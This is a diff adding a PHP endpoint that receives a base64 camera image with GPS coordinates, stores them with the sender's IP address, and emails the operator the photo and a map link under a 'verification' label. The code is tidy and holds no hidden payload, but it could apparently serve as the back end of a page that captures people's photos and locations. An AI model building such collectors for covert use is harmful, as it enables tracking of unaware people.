@@ -1,0 +1,150 @@
+<?php
+// send.php
+// Receives JSON POST with base64 JPEG + coordinates, saves the image, logs submission, and emails a notification.
+// IMPORTANT:
+// - Serve over HTTPS
+// - Configure $TO_EMAIL and $FROM_EMAIL
+// - Protect the endpoint in production (API keys / tokens / CORS / rate limiting)
+// - Place uploads outside webroot or disable directory listing/execution for uploads dir
+
+declare(strict_types=1);
+
+// CONFIG - update these before use
+$TO_EMAIL        = 'youremail@example.com';    // <-- set your email here
+$FROM_EMAIL      = 'no-reply@example.com';     // <-- sender shown in email
+$UPLOAD_DIR      = __DIR__ . '/uploads';
+$DATA_FILE       = __DIR__ . '/submissions.json';
+$MAX_IMAGE_BYTES = 2 * 1024 * 1024;            // 2 MB decoded image
+$REQUIRE_API_KEY = false;                      // set true to require X-API-KEY header
+$VALID_API_KEY   = getenv('API_KEY') ?: '';
+
+// helper responder
+function respond($code, $payload) {
+  http_response_code($code);
+  header('Content-Type: application/json; charset=utf-8');
+  echo json_encode($payload);
+  exit;
+}
+
+// Method check
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+  respond(405, ['error' => 'Method not allowed']);
+}
+
+// Optional API key check
+if ($REQUIRE_API_KEY) {
+  $clientKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
+  if (!$clientKey || $clientKey !== $VALID_API_KEY) {
+    respond(403, ['error' => 'Forbidden - invalid API key']);
+  }
+}
+
+// Read body
+$raw = file_get_contents('php://input');
+if (!$raw) respond(400, ['error' => 'Empty request body']);
+$data = json_decode($raw, true);
+if (!is_array($data)) respond(400, ['error' => 'Invalid JSON']);
+
+// Accept 'image_b64' or 'image'
+$image_field = $data['image_b64'] ?? $data['image'] ?? null;
+$lat = $data['latitude'] ?? null;
+$lon = $data['longitude'] ?? null;
+$accuracy = $data['accuracy'] ?? null;
+$timestamp = $data['timestamp'] ?? gmdate('c');
+$filename_hint = preg_replace('/[^a-zA-Z0-9._-]/', '_', ($data['filename_hint'] ?? 'capture.jpg'));
+
+if (!is_string($image_field) || $image_field === '') respond(400, ['error' => 'Missing image data']);
+if (!is_numeric($lat) || !is_numeric($lon)) respond(400, ['error' => 'Invalid or missing latitude/longitude']);
+
+// If data URI present, strip header
+if (strpos($image_field, 'data:') === 0) {
+  $parts = explode(',', $image_field, 2);
+  if (count($parts) !== 2) respond(400, ['error' => 'Invalid data URI']);
+  $image_b64 = $parts[1];
+} else {
+  $image_b64 = $image_field;
+}
+
+// Decode
+$image_data = base64_decode($image_b64, true);
+if ($image_data === false) respond(400, ['error' => 'Invalid base64 image']);
+if (strlen($image_data) > $MAX_IMAGE_BYTES) respond(413, ['error' => 'Image too large']);
+
+// Ensure upload dir
+if (!is_dir($UPLOAD_DIR)) {
+  if (!mkdir($UPLOAD_DIR, 0750, true)) respond(500, ['error' => 'Failed to create upload directory']);
+}
+
+// Save file
+$ext = 'jpg';
+$uniq = bin2hex(random_bytes(8));
+$safe_name = sprintf('%s_%s.%s', date('Ymd_His'), $uniq, $ext);
+$fullpath = $UPLOAD_DIR . DIRECTORY_SEPARATOR . $safe_name;
+
+if (file_put_contents($fullpath, $image_data) === false) respond(500, ['error' => 'Failed to save image']);
+@chmod($fullpath, 0640);
+
+// Append metadata
+$entry = [
+  'id' => uniqid('', true),
+  'filename' => $safe_name,
+  'path' => 'uploads/' . $safe_name,
+  'latitude' => floatval($lat),
+  'longitude' => floatval($lon),
+  'accuracy' => $accuracy,
+  'timestamp' => $timestamp,
+  'remote_ip' => $_SERVER['REMOTE_ADDR'] ?? ''
+];
+
+$all = [];
+if (file_exists($DATA_FILE)) {
+  $rawJson = file_get_contents($DATA_FILE);
+  $all = json_decode($rawJson, true) ?: [];
+}
+array_unshift($all, $entry);
+$all = array_slice($all, 0, 500);
+if (file_put_contents($DATA_FILE, json_encode($all, JSON_PRETTY_PRINT)) === false) {
+  $meta_error = true;
+} else {
+  $meta_error = false;
+}
+
+// Prepare email (simple multipart with attachment)
+$to = $TO_EMAIL;
+$subject = 'New Verification Received';
+$plain = "Verification Details:\n\nLatitude: {$entry['latitude']}\nLongitude: {$entry['longitude']}\nAccuracy: " . ($entry['accuracy'] ?? 'n/a') . "\nTime: {$entry['timestamp']}\n\nGoogle Maps:\nhttps://www.google.com/maps?q={$entry['latitude']},{$entry['longitude']}\n\nSaved file: {$entry['path']}\n";
+
+$separator = md5(time());
+$eol = PHP_EOL;
+
+$headers = [];
+$headers[] = "From: Verification System <{$FROM_EMAIL}>";
+$headers[] = "MIME-Version: 1.0";
+$headers[] = "Content-Type: multipart/mixed; boundary=\"{$separator}\"";
+
+$body = "--{$separator}{$eol}";
+$body .= "Content-Type: text/plain; charset=\"utf-8\"{$eol}";
+$body .= "Content-Transfer-Encoding: 7bit{$eol}{$eol}";
+$body .= $plain . $eol;
+
+$attachment = chunk_split(base64_encode($image_data));
+$body .= "--{$separator}{$eol}";
+$body .= "Content-Type: image/jpeg; name=\"{$safe_name}\"{$eol}";
+$body .= "Content-Transfer-Encoding: base64{$eol}";
+$body .= "Content-Disposition: attachment; filename=\"{$safe_name}\"{$eol}{$eol}";
+$body .= $attachment . $eol;
+$body .= "--{$separator}--{$eol}";
+
+$mail_sent = @mail($to, $subject, $body, implode($eol, $headers));
+
+// Response
+$response = [
+  'ok' => ($mail_sent && !$meta_error),
+  'mail_sent' => (bool)$mail_sent,
+  'saved' => true,
+  'entry' => $entry
+];
+if ($meta_error) $response['warning'] = 'Saved image but failed to update submissions.json';
+
+respond($mail_sent ? 200 : 500, $response);
+?>
